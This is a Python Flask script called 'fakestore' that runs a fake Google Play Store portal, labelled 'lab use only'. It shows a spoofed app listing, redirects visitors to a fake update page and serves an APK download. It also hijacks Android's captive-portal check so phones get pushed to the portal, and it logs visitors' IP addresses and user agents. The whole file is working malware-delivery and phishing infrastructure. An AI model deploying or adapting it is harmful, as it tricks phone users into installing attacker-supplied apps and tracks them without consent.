#!/usr/bin/env python3
"""
fakestore — fake Play Store dropper portal
Lab use only. Your device, your network.
"""

import os
import json
import datetime
from flask import Flask, request, render_template, send_file, redirect, make_response
from colorama import Fore, Style, init
import config

init(autoreset=True)

app = Flask(__name__, template_folder="templates", static_folder="static")
os.makedirs("logs", exist_ok=True)


def log_visit(endpoint: str, extra: dict = None):
    record = {
        "time": datetime.datetime.utcnow().isoformat(),
        "endpoint": endpoint,
        "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
        "ua": request.headers.get("User-Agent", ""),
        "referer": request.headers.get("Referer", ""),
    }
    if extra:
        record.update(extra)

    with open(config.LOG_FILE, "a") as f:
        f.write(json.dumps(record) + "\n")

    print(f"{Fore.GREEN}[+] {endpoint}{Style.RESET_ALL} "
          f"{record['ip']} — {record['ua'][:60]}")


@app.route("/")
def index():
    log_visit("index")
    return render_template(
        "index.html",
        app_name=config.APP_NAME,
        developer=config.APP_DEVELOPER,
        rating=config.APP_RATING,
        downloads=config.APP_DOWNLOADS,
    )


@app.route("/download")
def download():
    log_visit("download_tap")
    return redirect("/update")


@app.route("/update")
def update():
    log_visit("update_page")
    return render_template("update.html", app_name=config.APP_NAME)


@app.route("/app.apk")
def serve_apk():
    log_visit("apk_downloaded")
    apk = config.APK_FILE
    if not os.path.exists(apk):
        return "APK not built yet. See README.", 404
    return send_file(
        apk,
        mimetype="application/vnd.android.package-archive",
        as_attachment=True,
        download_name=f"{config.APP_NAME.replace(' ', '_')}.apk",
    )


# Android captive portal detection URL — makes the OS show "Sign in to network"
@app.route("/generate_204")
@app.route("/gen_204")
def captive_check():
    log_visit("android_captive_check")
    resp = make_response("", 302)
    resp.headers["Location"] = f"{config.PUBLIC_URL}/"
    return resp


if __name__ == "__main__":
    print(f"{Fore.CYAN}fakestore{Style.RESET_ALL} — fake Play Store portal")
    print(f"Serving at http://{config.HOST}:{config.PORT}")
    print(f"Phone should hit: {config.PUBLIC_URL}")
    print(f"{Fore.YELLOW}[*] Lab use only. Your device.{Style.RESET_ALL}\n")
    app.run(host=config.HOST, port=config.PORT, debug=False)
